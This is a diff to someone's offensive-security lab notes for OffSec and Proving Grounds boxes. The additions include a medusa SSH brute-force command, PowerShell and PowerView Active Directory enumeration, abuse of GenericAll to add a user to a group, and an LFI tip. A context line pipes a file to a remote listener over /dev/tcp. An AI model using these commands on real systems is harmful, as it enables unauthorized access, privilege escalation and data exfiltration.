@@ -1,7 +1,11 @@
 *************************[port maps]*************************
 
 
+(ospg:payday) in lfi read /etc/php5/apache2/php.ini if allow_url_include is diabled you can not do rfi
 
+offsec ssh bruteforce
+edusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
+-------------------------------------------
 (ospg:dibble) good for mongodb commands
 https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/dibble/6-27017-mongodb
 
@@ -797,6 +801,60 @@ To get the SPN
 Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
 Get-ADUser -Filter {ServicePrincipalNames -like "*"} -Properties ServicePrincipalNames | Select-Object Name, SamAccountName, ServicePrincipalNames
 
+perform AD Enumeration
+// on DC only
+
+//  get PDC for most updated LDAP
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name 
+// get the domain DN
+$DN = ([adsi]'').distinguishedName 
+$LDAP = "LDAP://$PDC/$DN"
+// One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the // domain. However, since we are already logged in, there is no need to do that here. 
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.FindAll()
+
+// 0x30000000 (decimal 805306368), enumerate all users in the domain
+$dirsearcher.filter="samAccountType=805306368"
+$dirsearcher.FindAll()
+
+// enumerate all users with showing attributes
+$dirsearcher.filter="samAccountType=805306368"
+$result = $dirsearcher.FindAll()
+
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+
+    Write-Host "-------------------------------"
+}
+
+// this search is better than the net.exe because net.exe does not show nested group only lists user // objects, not group objects and cannot 
+// display specific attributes enumerates more groups including Domain Local groups (not just global groups) 
+net group /domain
+net group "Sales Department" /domain
+// operating system and hostnames
+Get-NetComputer | select operatingsystem,dnshostname
+// determine if our current user has local administrative access permissions on any computers in the // domain
+Find-LocalAdminAccess
+// requires local admin on the machine to find logged in users
+// In a real-world engagement, or even in the Challenge Labs, we might accept that enumerating sessions with PowerView does not work and try to use a different tool. 
+Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+Get-NetSession -ComputerName client74
+// We can obtain the IP address and port number of applications running on servers integrated with // AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+// conver sid to name 
+Convert-SidToName 
+// genericall on a group add yourself and check (group specifics)
+net group "Management Department" stephanie /add /domain
+Get-NetGroup "Management Department" | select member
+// finding what group specifics we have on x
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+// list all shares that you have access to
+Find-DomainShare -CheckShareAccess
 -----------------------------------------------------------
 (ospg:marketing) 
 cat file.txt > /dev/tcp/10.10.10.189/9001
@@ -1044,6 +1102,7 @@ https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
     - use the service itself as part of the process like ldap or to exploit it like web
     - Silver Ticket Attacks
     - retrieve its GMSA (workstation specifics, groups specifics) (ospg:heist)
+    - local administrator privileges on specific servers (offsec:ad-enum)
 -------------------------------------------
 (ospg:) 
 [*] genericall - allows you to impersonate admin or any user in the domain
